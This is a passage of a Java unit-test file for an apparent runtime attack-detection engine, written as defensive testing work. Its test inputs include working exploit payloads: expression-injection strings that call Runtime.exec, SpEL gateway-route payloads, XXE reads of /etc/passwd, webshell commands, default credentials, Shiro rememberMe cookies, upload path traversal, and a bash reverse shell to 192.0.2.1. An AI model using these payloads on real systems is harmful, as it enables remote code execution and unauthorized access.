        "dest = y() - 500; // */ public class Double { static { "
            + "java.lang.Runtime.getRuntime().exec(\"id\"); } } /**";
    var result =
        engine.detectExpression("jiffle", expression, request(Map.of("script", List.of(expression))));

    assertAlgorithm(result, "jiffle_runtime");
    assertEquals("jiffle", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertTrue(!result.orElseThrow().details().containsKey("expression"));
  }

  @Test
  void detectsGeoServerCve202224816WpsJiffleRuntimeExecutionFromXmlBody() {
    String expression =
        "dest = y() - 500; // */ public class Double { static { "
            + "java.lang.Runtime.getRuntime().exec(\"id\"); } } /**";
    String body =
        """
        <wps:Execute service="WPS" version="1.0.0"
            xmlns:wps="http://www.opengis.net/wps/1.0.0"
            xmlns:ows="http://www.opengis.net/ows/1.1">
          <wps:DataInputs>
            <wps:Input>
              <ows:Identifier>script</ows:Identifier>
              <wps:Data><wps:LiteralData>%s</wps:LiteralData></wps:Data>
            </wps:Input>
          </wps:DataInputs>
        </wps:Execute>
        """
            .formatted(expression);
    RequestContext context =
        new RequestContext(
            "POST",
            "/geoserver/wms",
            "",
            Map.of(),
            Map.of("content-type", "application/xml"),
            body);

    var result = engine.detectExpression("jiffle", expression, context);

    assertAlgorithm(result, "jiffle_runtime");
    assertEquals("/geoserver/wms", result.orElseThrow().request().uri());
    assertEquals("true", result.orElseThrow().details().get("requestControlled"));
    assertEquals(String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertTrue(!result.orElseThrow().details().containsKey("expression"));
  }

  @Test
  void detectsMvelRuntimeExecution() {
    var result =
        engine.detectExpression(
            "mvel",
            "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream())",
            request());

    assertAlgorithm(result, "script_runtime");
  }

  @Test
  void detectsGroovyStringCommandExecution() {
    var result =
        engine.detectExpression(
            "groovy",
            "def command='id';def res=command.execute().text;res",
            request());

    assertAlgorithm(result, "script_runtime");
  }

  @Test
  void detectsXpathRuntimeExecution() {
    var result =
        engine.detectExpression(
            "xpath", "exec(java.lang.Runtime.getRuntime(),'touch /tmp/success')", request());

    assertAlgorithm(result, "xpath_runtime");
  }

  @Test
  void detectsXpathProcessBuilderExecution() {
    var result =
        engine.detectExpression(
            "xpath", "new java.lang.ProcessBuilder('id').start()", request());

    assertAlgorithm(result, "xpath_runtime");
  }

  @Test
  void ignoresHarmlessXpathExpression() {
    var result = engine.detectExpression("xpath", "/root/name/text()", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresHarmlessJexlExpression() {
    var result = engine.detectExpression("jexl", "user.name ?: 'guest'", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresHarmlessElExpression() {
    var result = engine.detectExpression("el", "${user.name}", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresHarmlessJiffleExpression() {
    var result = engine.detectExpression("jiffle", "dest = x() + y();", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRequestTimeJavaCompilationRuntimeExecution() {
    var result =
        engine.detectJavaCompilation(
            "javac",
            """
            public class Demo {
              static void run() throws Exception {
                java.lang.Runtime.getRuntime().exec("id");
              }
            }
            """,
            request());

    assertAlgorithm(result, "java_compile_runtime");
  }

  @Test
  void detectsJavaCompilationProcessBuilderExecution() {
    var result =
        engine.detectJavaCompilation(
            "janino",
            "class Demo { void run() throws Exception { new ProcessBuilder(\"id\").start(); } }",
            request());

    assertAlgorithm(result, "java_compile_runtime");
  }

  @Test
  void ignoresHarmlessJavaCompilation() {
    var result =
        engine.detectJavaCompilation(
            "javac", "public class Demo { int add(int a, int b) { return a + b; } }", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBackgroundJavaCompilationRuntimeExecution() {
    var result =
        engine.detectJavaCompilation(
            "javac",
            "public class Demo { void run() throws Exception { Runtime.getRuntime().exec(\"id\"); } }",
            RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresHarmlessSpringExpression() {
    var result = engine.detectExpression("spel", "T(java.lang.Math).abs(-1)", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresHarmlessGroovyScript() {
    var result = engine.detectExpression("groovy", "def total = 1 + 2; total", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsEvalRegex() {
    var result = engine.detectEval("eval", "return base64_decode($x);", request());

    assertAlgorithm(result, "eval_regex");
  }

  @Test
  void detectsLoadLibraryUnc() {
    var result = engine.detectLoadLibrary("System.load", "\\\\server\\share\\evil.dll", true, request());

    assertAlgorithm(result, "loadLibrary_unc");
  }

  @Test
  void detectsResponseIdentityCardLeak() {
    var result = engine.detectResponseDataLeak("application/json", "{\"id\":\"11010519491231002X\"}", request());

    assertAlgorithm(result, "response_dataLeak");
  }

  @Test
  void detectsResponseMobileLeak() {
    var result = engine.detectResponseDataLeak("text/html", "phone=13800138000", request());

    assertAlgorithm(result, "response_dataLeak");
  }

  @Test
  void detectsResponseBankCardLeak() {
    var result = engine.detectResponseDataLeak("application/xml", "<card>4111 1111 1111 1111</card>", request());

    assertAlgorithm(result, "response_dataLeak");
  }

  @Test
  void detectsXssEcho() {
    var result =
        engine.detectXssEcho(
            "hello <script>alert(1)</script>",
            request(Map.of("q", List.of("<script>alert(1)</script>"))));

    assertAlgorithm(result, "xss_echo");
  }

  @Test
  void detectsXssEchoContentWithoutRequestParameter() {
    var result = engine.detectXssEcho("hello <script>alert(1)</script>", request());

    assertAlgorithm(result, "xss_echo");
  }

  @Test
  void detectsWebshellEval() {
    var result =
        engine.detectWebshellEval("assert", "system('id')", request(Map.of("code", List.of("system('id')"))));

    assertAlgorithm(result, "webshell_eval");
  }

  @Test
  void detectsWebshellCommand() {
    var result =
        engine.detectWebshellCommand(
            List.of("sh", "-c", "id"), request(Map.of("cmd", List.of("sh -c id"))));

    assertAlgorithm(result, "webshell_command");
  }

  @Test
  void detectsWebshellFilePutContents() {
    var result =
        engine.detectWebshellFileWrite(
            "shell.jsp", "<% out.println(1); %>", request(Map.of("file", List.of("shell.jsp"))));

    assertAlgorithm(result, "webshell_file_put_contents");
  }

  @Test
  void detectsWebshellCallable() {
    var result = engine.detectWebshellCallable("system", request());

    assertAlgorithm(result, "webshell_callable");
  }

  @Test
  void detectsWebshellLdPreload() {
    var result = engine.detectWebshellLdPreload("LD_PRELOAD", "/tmp/evil.so", request());

    assertAlgorithm(result, "webshell_ld_preload");
  }

  @Test
  void detectsXxeProtocol() {
    var result = engine.detectXxeEntity("xxe", "file:///etc/passwd", request());

    assertTrue(result.isPresent());
    assertEquals("xxe_protocol", result.orElseThrow().algorithm());
  }

  @Test
  void detectsScannerRequest() {
    var context =
        new RequestContext(
            "GET", "/rasp/request", "", Map.of(), Map.of("user-agent", "sqlmap/1.7"));

    var result = engine.detectRequest(context);

    assertTrue(result.isPresent());
    assertEquals("request_scanner", result.orElseThrow().algorithm());
  }

  @Test
  void detectsUnusualRequest() {
    var context = new RequestContext("GET", "/rasp/request", "", Map.of(), Map.of());

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_unusual");
  }

  @Test
  void detectsInternalServiceIdentityOnSensitiveControlPath() {
    var context =
        new RequestContext(
            "GET",
            "/nacos/v1/auth/users",
            "pageNo=1&pageSize=9",
            Map.of(),
            Map.of("user-agent", "Nacos-Server"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_internal_identity");
  }

  @Test
  void detectsNacosCve202129441CreateUserInternalIdentityBypass() {
    var context =
        new RequestContext(
            "POST",
            "/nacos/v1/auth/users",
            "username=vulhub&password=vulhub",
            Map.of(),
            Map.of("user-agent", "Nacos-Server"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_internal_identity");
  }

  @Test
  void ignoresInternalServiceIdentityOnNonControlPath() {
    var context =
        new RequestContext(
            "GET",
            "/nacos/v1/ns/instance/list",
            "",
            Map.of(),
            Map.of("user-agent", "Nacos-Server"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresNormalUserAgentOnSensitiveControlPath() {
    var context =
        new RequestContext(
            "GET",
            "/nacos/v1/auth/users",
            "",
            Map.of(),
            Map.of("user-agent", "Mozilla/5.0"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsJwtSignedWithKnownDefaultSecret() {
    var context =
        new RequestContext(
            "GET",
            "/graphs",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "authorization",
                "Bearer "
                    + "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                    + "eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9."
                    + "mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_default_jwt_secret");
    assertEquals("hugegraph-default-token-secret", result.orElseThrow().details().get("keyId"));
  }

  @Test
  void ignoresJwtWithMismatchedDefaultSecretSignature() {
    var context =
        new RequestContext(
            "GET",
            "/graphs",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "authorization",
                "Bearer "
                    + "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
                    + "eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9."
                    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresMalformedBearerJwt() {
    var context =
        new RequestContext(
            "GET",
            "/graphs",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "authorization", "Bearer not-a-jwt"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsJwtVerificationFailureOnDataEaseApiToken() {
    var context =
        new RequestContext(
            "GET",
            "/de2api/user/info",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "x-de-token", forgedJwt()));

    var result =
        engine.detectJwtVerificationFailure(
            "auth0-java-jwt",
            "com.auth0.jwt.exceptions.SignatureVerificationException",
            "The Token's Signature resulted invalid when verified using the Algorithm: HmacSHA256",
            context);

    assertAlgorithm(result, "request_jwt_verification_failure");
    assertEquals("x-de-token", result.orElseThrow().details().get("tokenSource"));
    assertEquals("[redacted]", result.orElseThrow().request().headers().get("x-de-token"));
  }

  @Test
  void ignoresJwtVerificationFailureWithoutJwtHeader() {
    var result =
        engine.detectJwtVerificationFailure(
            "auth0-java-jwt",
            "com.auth0.jwt.exceptions.SignatureVerificationException",
            "invalid signature",
            requestUri("/de2api/user/info"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresJwtVerificationFailureOutsideControlPath() {
    var context =
        new RequestContext(
            "GET",
            "/assets/app.js",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "authorization", "Bearer " + forgedJwt()));

    var result =
        engine.detectJwtVerificationFailure(
            "auth0-java-jwt",
            "com.auth0.jwt.exceptions.SignatureVerificationException",
            "invalid signature",
            context);

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRememberMeCookieEncryptedWithKnownDefaultKey() {
    var context =
        new RequestContext(
            "GET",
            "/login",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "cookie",
                "sid=abc; rememberMe=AAECAwQFBgcICQoLDA0OD99XrYvceC/RUMm6dUki3C8=; theme=light"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_default_crypto_cookie");
    assertEquals("rememberMe", result.orElseThrow().details().get("cookieName"));
    assertEquals("shiro-default-aes-key", result.orElseThrow().details().get("keyId"));
  }

  @Test
  void detectsShiroCve20164437RootRememberMeCookie() {
    var context =
        new RequestContext(
            "GET",
            "/",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "cookie",
                "rememberMe=AAECAwQFBgcICQoLDA0OD99XrYvceC/RUMm6dUki3C8="));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_default_crypto_cookie");
    assertEquals("/", result.orElseThrow().details().get("uri"));
    assertEquals("GET", result.orElseThrow().details().get("method"));
  }

  @Test
  void detectsGzipBase64JsfViewStateSerializedClientState() {
    var payload = "H4sIAAAAAAAAA1vzloG1AAAWmZJ6BQAAAA==";
    var context =
        new RequestContext(
            "POST",
            "/index.xhtml",
            "javax.faces.ViewState=" + payload + "&submit=Login",
            Map.of("javax.faces.ViewState", List.of(payload), "submit", List.of("Login")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_serialized_client_state");
    assertEquals("javax.faces.ViewState", result.orElseThrow().details().get("parameter"));
    assertEquals("base64+gzip", result.orElseThrow().details().get("encoding"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals("5", result.orElseThrow().details().get("payloadLength"));
    assertEquals(
        List.of("[redacted]"),
        result.orElseThrow().request().parameters().get("javax.faces.ViewState"));
    assertTrue(result.orElseThrow().request().query().contains("javax.faces.ViewState=[redacted]"));
    assertTrue(!result.orElseThrow().request().query().contains(payload));
  }

  @Test
  void detectsBase64ViewStateSerializedClientState() {
    var payload = "rO0ABXA=";
    var context =
        new RequestContext(
            "POST",
            "/faces/login",
            "",
            Map.of("viewState", List.of(payload)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_serialized_client_state");
    assertEquals("viewState", result.orElseThrow().details().get("parameter"));
    assertEquals("base64", result.orElseThrow().details().get("encoding"));
  }

  @Test
  void ignoresRememberMeCookieWithInvalidCiphertext() {
    var context =
        new RequestContext(
            "GET",
            "/login",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "cookie",
                "rememberMe=AAECAwQFBgcICQoLDA0OD99XrYvceC/RUMm6dUki3CAA"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignJsfViewStateValue() {
    var context =
        new RequestContext(
            "POST",
            "/index.xhtml",
            "",
            Map.of("javax.faces.ViewState", List.of("1234567890abcdef")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresSerializedBytesOutsideClientStateParameter() {
    var context =
        new RequestContext(
            "POST",
            "/submit",
            "",
            Map.of("payload", List.of("rO0ABXA=")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresRememberMeCookieThatDecryptsToNonObjectStream() {
    var context =
        new RequestContext(
            "GET",
            "/login",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "cookie",
                "rememberMe=AAECAwQFBgcICQoLDA0OD0Hmlh7Qh11DXATvrT9sX58="));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsBasicAuthKnownDefaultCredentialOnManagementPath() {
    var context =
        new RequestContext(
            "GET",
            "/manager/html",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "authorization", basic("tomcat", "tomcat")));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_default_credential");
    assertEquals("tomcat-manager-default", result.orElseThrow().details().get("credentialId"));
    assertEquals("basic", result.orElseThrow().details().get("mechanism"));
    assertEquals("tomcat", result.orElseThrow().details().get("username"));
    assertEquals("Basic [redacted]", result.orElseThrow().request().headers().get("authorization"));
  }

  @Test
  void detectsFormKnownDefaultCredentialOnConsolePath() {
    var context =
        new RequestContext(
            "POST",
            "/console/j_security_check",
            "j_username=weblogic&j_password=Oracle%40123",
            Map.of("j_username", List.of("weblogic"), "j_password", List.of("Oracle@123")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_default_credential");
    assertEquals("weblogic-lab-default", result.orElseThrow().details().get("credentialId"));
    assertEquals("form", result.orElseThrow().details().get("mechanism"));
    assertEquals("j_username", result.orElseThrow().details().get("usernameSource"));
    assertEquals("[redacted]", result.orElseThrow().request().parameters().get("j_password").get(0));
    assertEquals("j_username=weblogic&j_password=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresKnownDefaultCredentialOutsideControlPath() {
    var context =
        new RequestContext(
            "POST",
            "/profile",
            "",
            Map.of("username", List.of("admin"), "password", List.of("admin")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresNonDefaultCredentialOnControlPath() {
    var context =
        new RequestContext(
            "GET",
            "/admin",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "authorization", basic("admin", "strong-password")));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsEmptyCredentialAuthBypassOnControlEndpoint() {
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/ProgramExport/",
            "USERNAME=&PASSWORD=&requirePasswordChange=Y",
            Map.of(
                "USERNAME", List.of(""),
                "PASSWORD", List.of(""),
                "requirePasswordChange", List.of("Y")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_empty_credential_bypass");
    assertEquals("USERNAME", result.orElseThrow().details().get("usernameParameter"));
    assertEquals("PASSWORD", result.orElseThrow().details().get("passwordParameter"));
    assertEquals("requirePasswordChange", result.orElseThrow().details().get("bypassParameter"));
  }

  @Test
  void ignoresEmptyCredentialsOnOrdinaryLoginEndpoint() {
    var context =
        new RequestContext(
            "POST",
            "/login",
            "USERNAME=&PASSWORD=&requirePasswordChange=Y",
            Map.of(
                "USERNAME", List.of(""),
                "PASSWORD", List.of(""),
                "requirePasswordChange", List.of("Y")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresControlEndpointEmptyCredentialsWithoutBypassFlag() {
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/ProgramExport/",
            "USERNAME=&PASSWORD=",
            Map.of("USERNAME", List.of(""), "PASSWORD", List.of("")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsConfluenceSetupCompletionStateReset() {
    var context =
        new RequestContext(
            "GET",
            "/server-info.action",
            "bootstrapStatusProvider.applicationConfig.setupComplete=false",
            Map.of("bootstrapStatusProvider.applicationConfig.setupComplete", List.of("false")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_setup_state_reset");
    assertEquals(
        "bootstrapStatusProvider.applicationConfig.setupComplete",
        result.orElseThrow().details().get("parameter"));
    assertEquals("false", result.orElseThrow().details().get("value"));
  }

  @Test
  void detectsBracketedSetupCompletionStateReset() {
    var context =
        new RequestContext(
            "GET",
            "/setup/setupadministrator.action",
            "bootstrapStatusProvider[applicationConfig][setupComplete]=0",
            Map.of("bootstrapStatusProvider[applicationConfig][setupComplete]", List.of("0")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_setup_state_reset");
    assertEquals("0", result.orElseThrow().details().get("value"));
  }

  @Test
  void ignoresSetupCompletionWhenNotReset() {
    var context =
        new RequestContext(
            "GET",
            "/server-info.action",
            "bootstrapStatusProvider.applicationConfig.setupComplete=true",
            Map.of("bootstrapStatusProvider.applicationConfig.setupComplete", List.of("true")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresOrdinaryNestedSetupCompleteState() {
    var context =
        new RequestContext(
            "POST",
            "/profile",
            "project.setupComplete=false",
            Map.of("project.setupComplete", List.of("false")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsServerSideScriptPutTrailingSlashBypass() {
    var context =
        new RequestContext("PUT", "/1.jsp/", "", Map.of(), Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_server_side_script_put");
    assertEquals("/1.jsp/", result.orElseThrow().details().get("path"));
  }

  @Test
  void detectsEncodedServerSideScriptPutPath() {
    var context =
        new RequestContext(
            "PUT", "/uploads/%73hell.jsp%2f", "", Map.of(), Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_server_side_script_put");
    assertEquals("/uploads/shell.jsp/", result.orElseThrow().details().get("path"));
  }

  @Test
  void ignoresServerSideScriptPathForReadOnlyRequest() {
    var context =
        new RequestContext("GET", "/index.jsp", "", Map.of(), Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresPutToStaticAssetPath() {
    var context =
        new RequestContext(
            "PUT", "/assets/upload/report.txt", "", Map.of(), Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsMultipartUploadFilenameOverrideTraversal() {
    var context =
        new RequestContext(
            "POST",
            "/index.action",
            "fileFileName=..%2Fshell.jsp",
            Map.of("fileFileName", List.of("../shell.jsp")),
            Map.of(
                "content-type",
                "multipart/form-data; boundary=----JUnit",
                "user-agent",
                "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_upload_filename_override");
    assertEquals("fileFileName", result.orElseThrow().details().get("parameter"));
    assertEquals("traversal", result.orElseThrow().details().get("targetType"));
    assertEquals("12", result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("fileFileName"));
    assertTrue(result.orElseThrow().request().query().contains("fileFileName=[redacted]"));
    assertFalse(result.orElseThrow().request().query().contains("shell.jsp"));
  }

  @Test
  void detectsMultipartOgnlUploadFilenameOverrideTraversal() {
    var context =
        new RequestContext(
            "POST",
            "/index.action",
            "top.fileFileName=..%2Fshell.jsp",
            Map.of("top.fileFileName", List.of("../shell.jsp")),
            Map.of(
                "content-type",
                "multipart/form-data; boundary=----JUnit",
                "user-agent",
                "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_upload_filename_override");
    assertEquals("top.fileFileName", result.orElseThrow().details().get("parameter"));
  }

  @Test
  void ignoresSafeMultipartUploadFilenameMetadata() {
    var context =
        new RequestContext(
            "POST",
            "/index.action",
            "fileFileName=reports%2Fsummary.txt",
            Map.of("fileFileName", List.of("reports/summary.txt")),
            Map.of(
                "content-type",
                "multipart/form-data; boundary=----JUnit",
                "user-agent",
                "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresUploadFilenameOverrideOutsideMultipartContext() {
    var context =
        new RequestContext(
            "POST",
            "/profile",
            "fileFileName=..%2Fshell.jsp",
            Map.of("fileFileName", List.of("../shell.jsp")),
            Map.of("content-type", "application/x-www-form-urlencoded", "user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsSchedulerShellJobDispatch() {
    var context =
        new RequestContext(
            "POST",
            "/run",
            "",
            Map.of(
                "jobId",
                List.of("1"),
                "executorHandler",
                List.of("demoJobHandler"),
                "executorParams",
                List.of("demoJobHandler"),
                "glueType",
                List.of("GLUE_SHELL"),
                "glueSource",
                List.of("touch /tmp/success"),
                "logId",
                List.of("1")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_scheduler_shell_job");
    assertEquals("glueType", result.orElseThrow().details().get("typeParameter"));
    assertEquals("glueSource", result.orElseThrow().details().get("sourceParameter"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("glueSource"));
  }

  @Test
  void detectsSchedulerShellJobDispatchFromJsonBody() {
    String body =
        """
        {
          "jobId": "1",
          "executorHandler": "demoJobHandler",
          "executorParams": "demoJobHandler",
          "executorBlockStrategy": "COVER_EARLY",
          "glueType": "GLUE_SHELL",
          "glueSource": "touch /tmp/success"
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/run",
            "",
            Map.of(),
            Map.of("content-type", "application/json", "user-agent", "JUnit"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_scheduler_shell_job");
    assertEquals("body.glueType", result.orElseThrow().details().get("typeParameter"));
    assertEquals("body.glueSource", result.orElseThrow().details().get("sourceParameter"));
    assertEquals("18", result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void ignoresSchedulerDispatchWithNonShellJobType() {
    var context =
        new RequestContext(
            "POST",
            "/run",
            "",
            Map.of(
                "jobId",
                List.of("1"),
                "executorHandler",
                List.of("demoJobHandler"),
                "glueType",
                List.of("BEAN"),
                "glueSource",
                List.of("normal handler")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresShellFieldsOutsideSchedulerShape() {
    var context =
        new RequestContext(
            "POST",
            "/api/render",
            "",
            Map.of("scriptType", List.of("shell"), "script", List.of("echo report")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresShellJsonFieldsOutsideSchedulerShape() {
    String body =
        """
        {"glueType":"GLUE_SHELL","glueSource":"echo report","description":"normal renderer"}
        """;
    var context =
        new RequestContext(
            "POST",
            "/api/render",
            "",
            Map.of(),
            Map.of("content-type", "application/json", "user-agent", "JUnit"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsTeamCityDebugProcessLaunchParameter() {
    var context =
        new RequestContext(
            "POST",
            "/app/rest/debug/processes",
            "exePath=id",
            Map.of("exePath", List.of("id")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_debug_process_launch");
    assertEquals("exePath", result.orElseThrow().details().get("parameter"));
    assertEquals("2", result.orElseThrow().details().get("commandLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("exePath"));
    assertEquals("exePath=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresDebugProcessesRequestWithoutExecutableParameter() {
    var context =
        new RequestContext(
            "POST",
            "/app/rest/debug/processes",
            "locator=all",
            Map.of("locator", List.of("all")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresExecutableParameterOutsideDebugProcessContext() {
    var context =
        new RequestContext(
            "POST",
            "/app/rest/builds",
            "exePath=id",
            Map.of("exePath", List.of("id")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsSparkRemoteJobSubmission() {
    var descriptor =
        """
        {
          "action": "CreateSubmissionRequest",
          "appResource": "https://example.com/jobs/Exploit.jar",
          "mainClass": "Exploit",
          "sparkProperties": {
            "spark.jars": "https://example.com/jobs/Exploit.jar"
          }
        }
        """;
    var context = new RequestContext("POST", "/v1/submissions/create", "", Map.of(), Map.of());

    var result = engine.detectRemoteJobSubmission("Spark REST", descriptor, context);

    assertAlgorithm(result, "request_remote_job_submission");
    assertEquals("https", result.orElseThrow().details().get("artifactScheme"));
    assertEquals("jar", result.orElseThrow().details().get("artifactType"));
  }

  @Test
  void detectsHadoopUnauthorizedYarnResourceManagerContainerCommandSubmission() {
    var descriptor =
        """
        {
          "application-id": "application_1",
          "am-container-spec": {
            "commands": {
              "command": "/bin/bash -i >& /dev/tcp/192.0.2.1/9999 0>&1"
            }
          },
          "application-type": "YARN"
        }
        """;
    var context = new RequestContext("POST", "/ws/v1/cluster/apps", "", Map.of(), Map.of());

    var result = engine.detectRemoteJobSubmission("YARN", descriptor, context);

    assertAlgorithm(result, "request_remote_job_submission");
    assertEquals("44", result.orElseThrow().details().get("commandLength"));
  }

  @Test
  void ignoresRemoteArtifactOutsideJobSubmissionContext() {
    var descriptor =
        """
        {"appResource":"https://example.com/library.jar","mainClass":"Example"}
        """;

    var result =
        engine.detectRemoteJobSubmission("HTTP JSON", descriptor, requestUri("/repository/upload"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresLocalJobSubmissionArtifact() {
    var descriptor =
        """
        {"appResource":"local:///opt/jobs/example.jar","mainClass":"Example"}
        """;

    var result =
        engine.detectRemoteJobSubmission("Spark REST", descriptor, requestUri("/v1/submissions/create"));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsGatewayRouteDynamicScriptConfig() {
    var routeConfig =
        """
        {"filters":[{"name":"AddResponseHeader","args":{"value":"#{T(java.lang.Runtime).getRuntime().exec('id')}"}}],"uri":"http://example.com"}
        """;
    var context =
        new RequestContext(
            "POST",
            "/actuator/gateway/routes/hacktest",
            "",
            Map.of("routeConfig", List.of(routeConfig)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("routeConfig", result.orElseThrow().details().get("parameter"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
  }

  @Test
  void detectsSpringCve202222947GatewayRouteJsonBodySpelConfig() {
    var body =
        """
        {
          "id": "hacktest",
          "filters": [{
            "name": "AddResponseHeader",
            "args": {
              "name": "Result",
              "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"
            }
          }],
          "uri": "http://example.com"
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/actuator/gateway/routes/hacktest",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.value", result.orElseThrow().details().get("parameter"));
